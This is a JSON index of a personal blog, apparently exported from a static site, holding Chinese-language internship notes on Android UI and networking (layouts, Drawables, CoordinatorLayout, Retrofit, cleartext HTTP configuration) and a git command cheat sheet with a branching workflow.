{"posts":[{"title":"projects","text":"fedml: deployment and modification to combine with Hyperledger fabric repo fabric: deployment and combination with fedml repo Yaml-Requests: read your yaml config file to generate python function repo Algorithm: notes for leetcode and other oj repo","link":"/home/2022/10/22/projects/"},{"title":"实习笔记-1","text":"px dp sp 的区别 px 其实就是像素单位，比如我们通常说的手机分辨列表800*400都是px的单位 sp 同dp相似，还会根据用户的字体大小偏好来缩放 dp 虚拟像素，在不同的像素密度的设备上会自动适配 隐藏状态栏任务栏 在api30之前1getWindow().getDecorView().setSystemUIVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN) api30后12345WindowCompat.setDecorFitsSystemWindows(window, false)WindowInsetsControllerCompat(window, window.decorView).let { it.hide(WindowInsetsCompat.Type.systemBars()) //it.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_BARS_BY_TOUCH} androidx.core 依赖的版本至少1.5 设置导航栏，状态栏颜色12window.statusBarColor = Color.TRANSPARENTwindow.navigationBarColor = Color.TRANSPARENT fragment 生命周期 onCreateView 与onActivityCreated 的区别onCreateView每次创建、绘制该Fragment的View组件时回调该方法，Fragment将会显示该方法返回的View组件。 onActivityCreated当Fragment所在的Activity被启动完成后回调该方法。 保存view的状态的时候需要用onActivityCreated 访问父activity的view层的时候需要在onActivityCreated 方法里面做 如果view是静态的，就可以在onCreateView之后取得view进行操作 如果view是动态的，则需要在onActivityCreated后find 1 静态布局1.1 View和ViewGroup静态布局都是由View和ViewGroup继承而来。 静态布局树状图 View是所有的UI组件都要继承并实现的，一个View要在屏幕上占据一块矩形区域。 ViewGroup是一个容器，可以将View添加进ViewGroup中，ViewGroup可以对其内的View进行布局，ViewGroup可以添加其他的ViewGroup。 所有的控件都是从View继承而来，ViewGroup是View的一个重要子类，绝大多数布局都是从ViewGroup继承而来。 1.3 六大布局1.3.1 LinearLayoutline是线的意思，linear是线性的意思，这个布局就是线性布局。只能横着排，或者只能竖着排。关键属性是orientation，这个是方向的意思。这个有两个选项 vertical，horizontal。是不是觉得太长记不住呢，有一个简便的记忆方法，利用IDE的自动提示功能，只要记住第一个字母就可以了对吧，可以把h记作横（heng）这样就不会错了。 1.3.2 RelativeLayoutrelative是相对的意思，这个布局是相对布局。相对布局就是依据父元素和某元素进行相对布局。有三种类型的属性： 属性值是true或falseandroid:layout_centerHrizontal 水平居中android:layout_centerVertical 垂直居中android:layout_centerInparent 相对于父元素完全居中。android:layout_alignParentBottom 位于父元素的下边缘android:layout_alignParentTop 位于父元素的上边缘android:layout_alignParentLeft 位于父元素的左边缘android:layout_alignParentRight 位于父元素的右边缘属性值是”@id/*“android:layout_below 在某元素的下方android:layout_above 在某元素的上方andorid:layout_toRightOf 在某元素的右方android:layout_toLeftOf 在某元素的左方android:layout_alignBottom 和某元素下方对齐android:layout_alignTop 和某元素上方对齐android:layout_alignRight 和某元素右方对齐android:layout_alignLeft 和某元素左方对齐属性值是数值android:layout_marginLeft 离某元素左边缘的距离android:layout_marginRight 离某元素右边缘的距离android:layout_marginTop 离某元素上边缘的距离android:layout_marginBottom 离某元素下边缘的距离上面这两种是最常用的两种布局，基本能完成一些基本的布局了。 1.3.3 自定义布局 自定义是对ViewGroup进行继承，一般要实现以下方法： 重写onMeasure()方法对子View进行测量。在onMeasure中计算childView的测量值以及模式，以及设置自己的宽和高。 重写onLayout()方法确定子View的位置，对所有childView进行定位（设置childView的绘制区域）。自定义ViewGroup是很有必要的，因为当官方给出的空间无法满足自己的需求时，就需要自己取定义一种布局了。 1.3.4 FrameLayout框架布局，第一个控件放在最底层的左上角，然后后面的控件在左上角一层一层的覆盖上去。类似于Ps图层的样子。 1.3.5 TableLayout表格布局，顾名思义，就是一个表格。它遵循着以下结构： 12345678&lt;TableLayout&gt; &lt;TableRow&gt; &lt;!-在这里填充第一行的元素-&gt; &lt;/TableRow&gt; &lt;TableRow&gt; &lt;!-在这里填充第二行的元素-&gt; &lt;/TableRow&gt; &lt;/TableLayout&gt; 还有几个重要属性： 写在TableLayout中的属性 android:stretchColumns 设置第几列为伸展(0表示第一列) ndroid:shrinkColumns 设置第几列为收缩 android:collapseColumns 设置第几列为隐藏 写在TableRow里的控件里的属性 android:layout_column 设置控件在第几列 android:layout_span 设置控件能跨多少列 1.3.6 AbsoluteLayout绝对布局，已经被淘汰了的布局。 所有控件都要设置x,y坐标，使用绝对的布局。 android:layout_x //控件x坐标android:layout_y //控件y坐标 1.4 控件 1.4.1 android自带控件1.4.2 自定义控件自定义控件有三种方法： 对现有控件进行扩展，继承控件后重写onDraw()方法，在回调父类方法前实现自己的逻辑。 通过组合来实现新的控件 重写View来实现全新的控件123456@Overrideprotected void onDraw(Canvas canvas){ //在回调之前实现自己逻辑。 super.onDraw(canvas); //在回调之后实现自己逻辑。} 2 动态布局2.1 用类修改xml可以使用findViewById找到想要进行接管的控件，然后再修改其中的属性，然后达到动态的目的。 2.2 动态生成首先创建一个布局管理器，然后使用setContentView()将布局管理器绘制出来,之后再用addView()方法加入控件元素 Drawable类及XMLDrawable的使用一.性质可直接使用.png、.jpg、.gif、9.png等图片作为资源,也可使用多种XML文件作为资源。（就是这些资源都能生成Drawable对象）。并对XML文件作出相关处理 二.XMLDrawable1.StateListDrawable(selector)作用：StateListDrawable对象所显示的Drawable对象会随着目标组件状态的改变而改变 组成： 123根元素&lt;selector/&gt;，子元素&lt;item/&gt;子元素&lt;item/&gt;的属性：android:color或android:drawableandroid:state_xxx:状态 2.LayerDrawable(ps图层)作用：可包含一个Drawable数组，系统会按照Drawable对象的数组顺序绘制，索引越大越被绘制在上层 12345根元素：&lt;layer-list&gt; 子元素：&lt;item/&gt;子元素的属性：android:drawable 作为LayerDrawable的Drawable对象android:id 为Drawable对象指定标识符android:buttom|top...等 指定Drawable的绘制位置 3.ShapeDrawable作用：设置一个基本的几何图形（矩形、圆形、线条灯） 12345678910根元素：&lt;shape/&gt;根元素的属性：android:shape=[&quot;rectangle&quot;|&quot;oval&quot;|&quot;line&quot;|&quot;ring&quot;]子元素：&lt;corners/&gt;：设置整体或者四个边角的弧度&lt;gradient/&gt;:渐变（可选择渐变的角度但必须是45的倍数，默认为0，渐变的中心点，渐变的类型，渐变的半径和开始和终止的颜色）&lt;padding/&gt;:内边距 （可以控制四周的边距）&lt;size/&gt;:形状的大小 （设置形状的宽高）&lt;solid/&gt;:单种颜色填充 &lt;stroke/&gt;:绘制边框 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;shape xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:dither=[&quot;true&quot; | &quot;false&quot;] //将在位图的像素配置与屏幕不同时（例如：ARGB 8888 位图和 RGB 565 屏幕）启用位图的抖动；值为“false”时则停用抖动。默认值为 true。 android:shape=[&quot;rectangle&quot; | &quot;oval&quot; | &quot;line&quot; | &quot;ring&quot;]//分别为矩形、椭圆、线、环。默认为矩形rectangle android:innerRadius=&quot;integer&quot; // shape为ring时有效，内环半径 android:innerRadiusRatio=&quot;float&quot; // shape为ring时有效，内环的厚度比，即环的图形宽度与内环半径的比例，按照这个比例计算内环半径，默认为3，可被innerRadius值覆盖 android:thickness=&quot;integer&quot; // shape为ring时有效，环的厚度 android:thicknessRatio=&quot;float&quot; // shape为ring时有效，环的厚度比，即环的图形宽度与环的厚度的比例，按照这个比例计算环的厚度，默认为9，可被thickness值覆盖 android:tint=&quot;color&quot; // 给shape着色 android:tintMode=[&quot;src_in&quot; | &quot;src_atop&quot; | &quot;src_over&quot; | &quot;add&quot; | &quot;multiply&quot; | &quot;screen&quot;] // 着色类型 android:useLevel=[&quot;true&quot; | &quot;false&quot;] // 较少用，一般设为false，否则图形不显示。为true时可在LevelListDrawable使用 android:visible=[&quot;true&quot; | &quot;false&quot;] &gt; &lt;!-- 圆角 --&gt; &lt;corners android:radius=&quot;integer&quot; // 圆角半径，设置下面四个属性时，对应的位置属性会被覆盖 android:topLeftRadius=&quot;integer&quot; // 左上角圆角半径 android:topRightRadius=&quot;integer&quot; // 右上角圆角半径 android:bottomLeftRadius=&quot;integer&quot; // 左下角圆角半径 android:bottomRightRadius=&quot;integer&quot; // 右下角圆角半径 /&gt; &lt;!-- 渐变 --&gt; &lt;gradient android:type=[&quot;linear&quot; | &quot;radial&quot; | &quot;sweep&quot;]// 渐变类型，线性、放射性、扫描性；默认为线性 android:angle=&quot;integer&quot; // 渐变角度，渐变类型为linear时有效；默认为0，从左至右渐变，角度逆时针方向计算，角度需要时45的整数倍数 android:centerColor=&quot;integer&quot; // 渐变中间位置颜色 android:startColor=&quot;color&quot; // 渐变开始位置颜色 android:endColor=&quot;color&quot; // 渐变结束位置颜色 android:centerX=&quot;float&quot; // 设置渐变中心的X坐标，取值区间[0,1]，默认为0.5，即中心位置 android:centerY=&quot;float&quot; // 设置渐变中心的Y坐标，取值区间[0,1]，默认为0.5，即中心位置 android:gradientRadius=&quot;integer&quot; // type为放射性渐变radial时有效，渐变的半径 android:useLevel=[&quot;true&quot; | &quot;false&quot;] // 与shape中该属性的一致 /&gt; &lt;!-- 内边距 --&gt; &lt;padding android:left=&quot;integer&quot; // 左边距 android:top=&quot;integer&quot; // 上边距 android:right=&quot;integer&quot; // 右边距 android:bottom=&quot;integer&quot; // 下边距 /&gt; &lt;!-- 大小 --&gt; &lt;size android:width=&quot;integer&quot; // 图形宽度 android:height=&quot;integer&quot; // 图形高度 /&gt; &lt;!-- 填充 --&gt; &lt;solid android:color=&quot;color&quot; // 图形的填充色 /&gt; &lt;!-- 描边 --&gt; &lt;stroke android:width=&quot;integer&quot; // 描边的宽度 android:color=&quot;color&quot; // 描边的颜色 android:dashWidth=&quot;integer&quot; // 虚线宽度 android:dashGap=&quot;integer&quot; // 虚线间隔 /&gt;&lt;/shape&gt; 可设置画笔的颜色和粗细并设置每画一条线的长度和间距且必须两者都设置才有效 4.ClipDrawable作用：从Drawable上截取一个”图片片段” 123456根元素：&lt;clip&gt; 不使用子元素。根元素属性： android:drawable: 选定Drawable对象android:clipOrientation:指定截取方向android:gravity:从什么地方开始截取 总结：选定图片并选择方向与位置截取图片 使用：从java中获取ClipDrawable并用setLevel()改变截取大小 //setLevel()只能从0~10000 123456&lt;!--res/drawable/test_clip.xml--&gt;&lt;clip xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:drawable=&quot;@mipmap/start&quot; android:clipOrientation=&quot;horizontal&quot; android:gravity=&quot;center&quot;&gt;&lt;/clip&gt; 123456789101112131415&lt;!--res/layout/activity_main.xml--&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot; tools:context=&quot;com.chen.android.test.MainActivity&quot;&gt; &lt;ImageView android:id=&quot;@+id/imageView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:src=&quot;@drawable/test_clip&quot;/&gt;&lt;/LinearLayout&gt; 12345678910111213141516171819202122232425262728293031323334353637/*实现图片渐渐展开的效果*/public class MainActivity extends AppCompatActivity { int data = 0; int what = 0X11; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ImageView img = (ImageView)findViewById(R.id.imageView); //ImageView.getDrawable()获取的是当前控件里的图片，返回的是Drawable类型,还有说明Drawable对象可随意变成子对象并调用子对象的方法 final ClipDrawable clipDrawable = (ClipDrawable)img.getDrawable(); //创建Handler等待计时器传送的信息，使图片扩展 final Handler mHandler = new Handler(){ @Override public void handleMessage(Message msg) { super.handleMessage(msg); if (msg.what == what){ clipDrawable.setLevel(data);//扩大截取的图片面积 data += 200; } } }; //创建计时器 final Timer timer = new Timer(); timer.schedule(new TimerTask() { @Override public void run() { if (data &gt;= 10000){ timer.cancel(); } mHandler.obtainMessage(what).sendToTarget(); } },0,300); }} 5.AnimationDrawable简介：放在res/anim下，支持逐帧动画和补间动画 12345678910111213根元素：&lt;set&gt; 根元素属性：android:interpolator=&quot;参数&quot;linear_interpolator：匀速变换 accelerate_interpolar：加速变换decelerate_interpolator：减速变换android:shareInterpolator= &quot;true|false&quot; ：是否让资源的interpolator与根元素相同android:duration=&quot;时间&quot;：定义持续时间子元素(同样可以设置duration)&lt;alpha&gt;：设置开始和结束的透明度&lt;scale&gt;：设置缩放的中心、开始的X，Y的尺寸和结束时X,Y的尺寸&lt;translate&gt;：设置图片的开始位置和结束位置进行位移&lt;rotate&gt;：设置旋转的中心、开始的角度和结束时候的角度 注意：利用android:fillAfter=”true|false”：设置保留后的状态（哪个状态想保留就用这个，如果都像就放在set中） 使用：利用AnimationUtils的静态方法loadAninmation(Context context,int resId) 123456789101112131415161718192021222324&lt;!--在res/anim/test_animtaion中--&gt;&lt;set xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:interpolator=&quot;@android:anim/linear_interpolator&quot; android:shareInterpolator=&quot;true&quot; android:fillAfter=&quot;true&quot;&gt; &lt;alpha android:fromAlpha=&quot;50.0&quot; android:toAlpha=&quot;100.0&quot; /&gt; &lt;scale android:pivotX=&quot;50%&quot; android:pivotY=&quot;50%&quot; android:fromXScale=&quot;1.0&quot; android:fromYScale=&quot;1.0&quot; android:toXScale=&quot;1.5&quot; android:toYScale=&quot;1.5&quot; android:duration=&quot;3000&quot; /&gt; &lt;translate android:fromXDelta=&quot;30&quot; android:toXDelta=&quot;300&quot; android:fromYDelta=&quot;40&quot; android:toYDelta=&quot;90&quot; android:duration=&quot;3000&quot;/&gt;&lt;/set&gt; 123456789101112131415/*实现动画*/public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ImageView img = (ImageView)findViewById(R.id.imageView); /*利用工具类获取对象*/ Animation animation= AnimationUtils.loadAnimation(this,R.anim.test_animation); /*将动画附加在图片上*/ img.startAnimation(animation); }}","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8812%E6%97%A5/"},{"title":"实习笔记-2","text":"retrofit 参考 – Retrofit + RxJava ＋ OkHttp 让网络请求变的简单-基础篇","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8813%E6%97%A5/"},{"title":"实习笔记-3","text":"在安卓中显示gif图片使用WebView 123456&lt;WebView android:id=&quot;@+id/runWebView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_centerHorizontal=&quot;true&quot; android:layout_centerVertical=&quot;true&quot; /&gt; 12345678runWebView.loadDataWithBaseURL(null,&quot;&lt;html&gt; &lt;body bgcolor='#f3f3f3'&gt; &lt;div align=center&gt; &lt;IMG src='file:///android_asset/run.gif'/&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;&quot;, &quot;text/html&quot;, &quot;UTF-8&quot;,null); 实现底部状态栏使用recyclerview + gridlayoutmanager12345val rc_btm_navi = findViewById&lt;RecyclerView&gt;(R.id.rc_btm_navi)rc_btm_navi.layoutManager = GridLayoutManager(this,1).apply { orientation = GridLayoutManager.HORIZONTAL}rc_btm_navi.adapter = navi_adapter() adaper中获取屏幕宽度，创建view时设置view的宽度1234567891011override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): view_holder { val view: View = LayoutInflater.from(parent.context) .inflate( R.layout.item_navi, parent, false ) view.layoutParams.width = getScreenWidth(activity) / navi_arr.size return view_holder(view)} 自定义下拉刷新(没学会) TRANSLUCENT 半透明 rectF类 Rect F holds four float coordinates for a rectangle . The rectangleis represented by the coordinates of its 4 edges ( left , top , rightbottom ). These fields can be accessed directly . Use width () andheight () to retrieve the rectangle ’ s width and height . Note :most methods do not check to see that the coordinates are sortedcorrectly ( i . e . left &lt;= right and top &lt;= bottom ). ViewFlipper(翻转视图) 就是首次安装软件后的功能介绍页面 使用导入图片123456789101112131415&lt;ViewFlipper android:id=&quot;@+id/vflp_help&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:inAnimation=&quot;@anim/right_in&quot; android:outAnimation=&quot;@anim/right_out&quot; android:flipInterval=&quot;3000&quot;&gt; &lt;include layout=&quot;@layout/page_help_one&quot; /&gt; &lt;include layout=&quot;@layout/page_help_two&quot; /&gt; &lt;include layout=&quot;@layout/page_help_three&quot; /&gt; &lt;include layout=&quot;@layout/page_help_four&quot; /&gt; &lt;!--此处为静态导入--&gt;&lt;/ViewFlipper&gt; 123456789//动态导入for(int i = 0;i &lt; resId.length;i++){ vflp_help.addView(getImageView(resId[i]));}private ImageView getImageView(int resId){ ImageView img = new ImageView(this); img.setBackgroundResource(resId); return img;} 翻动手动翻动 自定义一个GestureListener 创建一个GestureDetector 重写activity的onTouchEvent12345678910111213141516171819private class MyGestureListener extends GestureDetector.SimpleOnGestureListener { @Override public boolean onFling(MotionEvent e1, MotionEvent e2, float v, float v1) { if(e1.getX() - e2.getX() &gt; MIN_MOVE){ vflp_help.setInAnimation(mContext,R.anim.right_in); vflp_help.setOutAnimation(mContext, R.anim.right_out); vflp_help.showNext(); }else if(e2.getX() - e1.getX() &gt; MIN_MOVE){ vflp_help.setInAnimation(mContext,R.anim.left_in); vflp_help.setOutAnimation(mContext, R.anim.left_out); vflp_help.showPrevious(); } return true; }}@Overridepublic boolean onTouchEvent(MotionEvent event) { return mDetector.onTouchEvent(event);} 12//自动翻动vflp_help.startFlipping(); fragment中实现触摸事件参考","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8814%E6%97%A5/"},{"title":"实习笔记-4","text":"ImageView的参数1android:adjustViewBounds=&quot;true&quot; 对应源码1234567@android.view.RemotableViewMethodpublic void setAdjustViewBounds(boolean adjustViewBounds) { mAdjustViewBounds = adjustViewBounds; if (adjustViewBounds) { setScaleType(ScaleType.FIT_CENTER); }} 应用场景 当宽高有且仅有一个设置为wrapContent的时候是有用，指定一个宽or高，再根据drawable的比例确定另一个高/宽的值 协调者布局 CoordinateLayout作用协调子 View 之间交互的容器 使用例1 点击FloatingActionBar弹出sneakbar，如果不适用CoordinateLayout，会导致弹出的SneakBar遮挡住FAB layout_scrollFlags scroll|exitUntilCollapsed如果AppBarLayout的直接子控件设置该属性,该子控件可以滚动,向上滚动NestedScrollView出父布局(一般为CoordinatorLayout)时,会折叠到顶端,向下滚动时NestedScrollView必须滚动到最上面的时候才能拉出该布局 scroll|enterAlways只要向下滚动该布局就会显示出来,只要向上滑动该布局就会向上收缩 scroll|enterAlwaysCollapsed向下滚动NestedScrollView到最底端时该布局才会显示出来如果不设置改属性,则改布局不能滑动 snap滑动时的弹性 CollapsingToolbarLayout它的直接子布局可以使用的属性:app:layout_collapseMode(折叠模式) pin:在滑动过程中,此自布局会固定在它所在的位置不动,直到CollapsingToolbarLayout全部折叠或者全部展开 parallax:视差效果，在折叠的时候会有个视差折叠的效果 不设置:跟随NestedScrollView的滑动一起滑动,NestedScrollView滑动多少距离他就会跟着走多少距离 自定义Behavior通常自定义Behavior分为两种情况： 某个View依赖另一个View，监听其位置、尺寸等状态的变化。 某个View监听CoordinatorLayout内实现了NestedScrollingChild接口的子View的滑动状态变化(也是一种依赖关系)。 只有CoordinatorLayout的直接子布局才能响应 效果示例 可override的几个函数 onInterceptTouchEvent()：是否拦截触摸事件 onTouchEvent()：处理触摸事件 layoutDependsOn()：确定使用Behavior的View要依赖的View的类型 onDependentViewChanged()：当被依赖的View状态改变时回调 onDependentViewRemoved()：当被依赖的View移除时回调 onMeasureChild()：测量使用Behavior的View尺寸 onLayoutChild()：确定使用Behavior的View位置 onStartNestedScroll()：嵌套滑动开始（ACTION_DOWN），确定Behavior是否要监听此次事件 onStopNestedScroll()：嵌套滑动结束（ACTION_UP或ACTION_CANCEL） onNestedScroll()：嵌套滑动进行中，要监听的子 View的滑动事件已经被消费 onNestedPreScroll()：嵌套滑动进行中，要监听的子 View将要滑动，滑动事件即将被消费（但最终被谁消费，可以通过代码控制） onNestedFling()：要监听的子 View在快速滑动中 onNestedPreFling()：要监听的子View即将快速滑动 (参考)[https://www.jianshu.com/p/b987fad8fcb4] NestedScrollView NestedScrollView 与 ScrollView 一样，内部只能容纳一个子控件。当存在多个组件（产生滑动冲突时），解决冲突的办法：1android:nestedScrollingEnabled=&quot;false&quot; RecyclerView 实现瀑布流效果 1）通过LinearLayoutManager：我们可以实现横向、纵向的列表效果 2）通过GridLayoutManager：我们可以实现像GridView一样的网格布局 3）通过StaggeredGridLayoutManager：我们可以实现瀑布流的效果 网络请求踩坑明码传输 D/OkHttp: &lt;– HTTP FAILED: java.net.UnknownServiceException: CLEARTEXT communication to japi.juhe.cn not permitted by network security policy 为保证用户数据和设备的安全，Google针对下一代 Android 系统(Android P) 的应用程序，将要求默认使用加密连接，这意味着 Android P 将禁止 App 使用所有未加密的连接，因此运行 Android P 系统的安卓设备无论是接收或者发送流量，未来都不能明码传输。 在res文件夹下创建一个xml文件夹，然后创建一个network_security_config.xml文件，文件内容如下：1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;network-security-config&gt; &lt;base-config cleartextTrafficPermitted=&quot;true&quot; /&gt;&lt;/network-security-config&gt; 接着，在AndroidManifest.xml文件下的application标签增加以下属性1android:networkSecurityConfig=&quot;@xml/network_security_config&quot; 声明权限 12&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt; 注意标签是uses-permission，不是permission","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B41%E6%9C%8817%E6%97%A5/"},{"title":"实习笔记-5","text":"git相关知识 参考 新建代码库12345678## 当前目录 新建一个Git代码库$ git init ## 新建一个目录，将其初始化为Git代码库$ git init [project-name] ## 下载一个项目和它的整个代码历史$ git clone [url] 配置123456789## 显示当前的Git配置$ git config --list ## 编辑Git配置文件$ git config -e [--global] ## 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot; 增加/删除文件123456789101112131415161718192021## 添加指定文件到暂存区$ git add [file1] [file2] ... ## 添加指定目录到暂存区，包括子目录$ git add [dir] ## 添加当前目录的所有文件到暂存区$ git add . ## 添加每个变化前，都会要求确认## 对于同一个文件的多处变化，可以实现分次提交$ git add -p ## 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ... ## 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file] ## 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed] -p 参数的提示1234567891011121314y - stage this hunkn - do not stage this hunkq - quit; do not stage this hunk nor any of the remaining onesa - stage this hunk and all later hunks in the filed - do not stage this hunk nor any of the later hunks in the fileg - select a hunk to go to/ - search for a hunk matching the given regexj - leave this hunk undecided, see next undecided hunkJ - leave this hunk undecided, see next hunkk - leave this hunk undecided, see previous undecided hunkK - leave this hunk undecided, see previous hunks - split the current hunk into smaller hunkse - manually edit the current hunk? - print help 代码提交123456789101112131415161718## 提交暂存区到仓库区$ git commit -m [message] ## 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message] ## 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a ## 提交时显示所有diff信息$ git commit -v ## 使用一次新的commit，替代上一次提交## 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message] ## 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ... 分支123456789101112131415161718192021222324252627282930313233343536373839404142## 列出所有本地分支$ git branch ## 列出所有远程分支$ git branch -r ## 列出所有本地分支和远程分支$ git branch -a ## 新建一个分支，但依然停留在当前分支$ git branch [branch-name] ## 以远程分支为基础新建一个分支，并切换到该分支$ git checkout -b [branch] origin/[remote-branch] ## 新建一个分支，指向指定commit$ git branch [branch] [commit] ## 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch] ## 切换到指定分支，并更新工作区$ git checkout [branch-name] ## 切换到上一个分支$ git checkout - ## 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch] ## 合并指定分支到当前分支$ git merge [branch] ## 选择一个commit，合并进当前分支$ git cherry-pick [commit] ## 删除分支$ git branch -d [branch-name] ## 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 标签 Git 可以给仓库历史中的某一个提交打上标签，以示重要。 比较有代表性的是人们会使用这个功能来标记发布结点（ v1.0 、 v2.0 等等）。 You have to commit first before tagging1234567891011121314151617181920212223242526272829303132## 列出所有tag$ git tag## 查看tag的信息$ git show [tag] ## 新建一个tag在当前commit$ git tag -a v1.4 -m &quot;my version 1.4&quot;## 轻量标签$ git tag [tag]## 轻量标签本质上是将提交校验和存储到一个文件中，没有保存任何其他信息。 ## 新建一个tag在指定commit$ git tag [tag] [commit] ## 删除本地tag$ git tag -d [tag] ## 删除远程tag$ git push origin :refs/tags/[tagName] ## 查看tag信息$ git show [tag] ## 提交指定tag$ git push [remote] [tag] ## 提交所有tag$ git push [remote] --tags ## 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960## 显示有变更的文件，本地未commit的文件$ git status ## 显示当前分支的版本历史$ git log ## 显示commit历史，以及每次commit发生变更的文件$ git log --stat ## 搜索提交历史，根据关键词$ git log -S [keyword] ## 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s ## 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature ## 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file] ## 显示指定文件相关的每一次diff$ git log -p [file] ## 显示过去5次提交$ git log -5 --pretty --oneline ## 显示所有提交过的用户，按提交次数排序$ git shortlog -sn ## 显示指定文件是什么人在什么时间修改过$ git blame [file] ## 显示暂存区和工作区的差异$ git diff ## 显示暂存区和上一个commit的差异$ git diff --cached [file] ## 显示工作区与当前分支最新commit之间的差异$ git diff HEAD ## 显示两次提交之间的差异$ git diff [first-branch]...[second-branch] ## 显示今天你写了多少行代码$ git diff --shortstat &quot;@{0 day ago}&quot; ## 显示某次提交的元数据和内容变化$ git show [commit] ## 显示某次提交发生变化的文件$ git show --name-only [commit] ## 显示某次提交时，某个文件的内容$ git show [commit]:[filename] ## 显示当前分支的最近几次提交$ git reflog 远程同步1234567891011121314151617181920212223## 下载远程仓库的所有变动$ git fetch [remote] ## 显示所有远程仓库$ git remote -v ## 显示某个远程仓库的信息$ git remote show [remote] ## 增加一个新的远程仓库，并命名$ git remote add [shortname] [url] ## 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch] ## 上传本地指定分支到远程仓库$ git push [remote] [branch] ## 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force ## 推送所有分支到远程仓库$ git push [remote] --all 撤销12345678910111213141516171819202122232425262728293031## 恢复暂存区的指定文件到工作区$ git checkout [file] ## 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file] ## 恢复暂存区的所有文件到工作区$ git checkout . ## 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file] ## 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard ## 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit] ## 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit] ## 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit] ## 新建一个commit，用来撤销指定commit## 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit] ## 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop git分支管理master分支和开发分支 主分支只用来分布重大版本，日常开发应该在另一条分支上完成。我们把开发用的分支，叫做Develop。 创建develop分支1git checkout -b develop master 合并12345## 切换到Master分支git checkout master## 对Develop分支进行合并git merge --no-ff develop --no-ff参数 默认情况下，Git执行”快进式合并”（fast-farward merge），会直接将Master分支指向Develop分支。 使用--no-ff参数，会执行正常合并，在Master分支上生成一个新节点 功能分支 为了开发某种特定功能，从Develop分支上面分出来的。开发完成后，要再并入Develop。 功能分支的名字，可以采用feature-*的形式命名。 创建一个功能分支：1git checkout -b feature-x develop 开发完成后，将功能分支合并到develop分支：123git checkout developgit merge --no-ff feature-x 删除feature分支：1git branch -d feature-x 预发布分支 指发布正式版本之前（即合并到Master分支之前），我们可能需要有一个预发布的版本进行测试。 预发布分支是从Develop分支上面分出来的，预发布结束以后，必须合并进Develop和Master分支。它的命名，可以采用release-*的形式。 创建一个预发布分支：1git checkout -b release-1.2 develop 确认没有问题后，合并到master分支：123456git checkout mastergit merge --no-ff release-1.2## 对合并生成的新节点，做一个标签git tag -a 1.2 再合并到develop分支：123git checkout developgit merge --no-ff release-1.2 最后，删除预发布分支：1git branch -d release-1.2 修补bug分支 修补bug分支是从Master分支上面分出来的。修补结束以后，再合并进Master和Develop分支。它的命名，可以采用fixbug-*的形式。 创建一个修补bug分支：12git checkout -b fixbug-0.1 master## 以master分支为基础，创建一个分支 修补结束后，合并到master分支：12345678git checkout master## 切换到master分支git merge --no-ff fixbug-0.1#合并分支git tag -a 0.1.1## 打tag 再合并到develop分支：123git checkout developgit merge --no-ff fixbug-0.1 